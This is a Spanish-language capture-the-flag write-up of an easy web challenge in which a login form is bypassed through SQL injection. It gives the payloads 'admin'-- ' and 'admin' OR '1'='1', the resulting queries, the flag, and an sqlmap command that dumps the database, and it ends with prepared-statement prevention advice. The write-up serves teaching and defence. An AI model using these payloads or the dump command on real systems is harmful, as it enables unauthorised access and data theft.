---
title: "SQL Injection en Login - WebCTF 2024"
description: "Explotar una vulnerabilidad de inyección SQL en un formulario de login para obtener acceso administrativo."
ctfName: "WebCTF 2024"
category: "web"
difficulty: "easy"
points: 150
pubDate: 2024-11-05
heroImage: "/images/ctf/default-ctf.png"
tags: ["web", "sql-injection", "authentication-bypass", "sqli"]
language: es
solves: 1456
author: "WebCTF Team"
skillLevel: "beginner"
estimatedTime: "30-45 minutos"
tools: ["burpsuite", "sqlmap", "browser-devtools"]
---

# SQL Injection en Login - WebCTF 2024

## Descripción

Se nos presenta un formulario de login vulnerable a inyección SQL. El objetivo es bypassear la autenticación y acceder como administrador para obtener la flag.

## Reconocimiento

Al acceder al sitio encontramos un formulario simple:

```html
<form method="POST" action="/login">
  <input type="text" name="username" placeholder="Usuario">
  <input type="password" name="password" placeholder="Contraseña">
  <button type="submit">Login</button>
</form>
```

## Pruebas Iniciales

Probamos con credenciales normales:
- Usuario: `admin`
- Contraseña: `password`

**Respuesta**: "Credenciales inválidas"

## Detectando la Vulnerabilidad

Probamos con una comilla simple en el campo usuario:
```
Usuario: admin'
Password: password
```

**Error SQL**: `You have an error in your SQL syntax near ''admin''' at line 1`

¡El sitio es vulnerable a SQL Injection!

## Análisis de la Query

La consulta probablemente sea:
```sql
SELECT * FROM users WHERE username='admin'' AND password='password'
```

## Explotación

### Método 1: Comentarios SQL

Podemos comentar el resto de la query:

```
Usuario: admin'-- 
Password: cualquiera
```

La query resultante:
```sql
SELECT * FROM users WHERE username='admin'-- ' AND password='cualquiera'
```

### Método 2: Lógica OR

También podemos usar una condición siempre verdadera:

```
Usuario: admin' OR '1'='1
Password: cualquiera
```

Query resultante:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='cualquiera'
```

## Solución

Usando el payload `admin'-- ` en el campo usuario:

1. Intercept la petición con Burp Suite (opcional)
2. Enviar el formulario con:
   - Usuario: `admin'-- `
   - Password: `test`
3. ¡Acceso concedido!

**Respuesta del servidor**:
```
Welcome, admin!
Flag: CTF{sql_1nj3ct10n_1s_d4ng3r0us}
```

## Prevención

Para evitar esta vulnerabilidad:

```python
# ❌ Vulnerable
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# ✅ Seguro - Prepared Statements
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
```

## Comandos Útiles

Si queremos automatizar con SQLmap:

```bash
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" \
  --level=5 --risk=3 \
  --dump
```

## Flag

`CTF{sql_1nj3ct10n_1s_d4ng3r0us}`

## Lecciones Aprendidas

- ✅ Siempre validar entrada del usuario
- ✅ Usar prepared statements
- ✅ Sanitizar caracteres especiales
- ✅ Implementar WAF (Web Application Firewall)
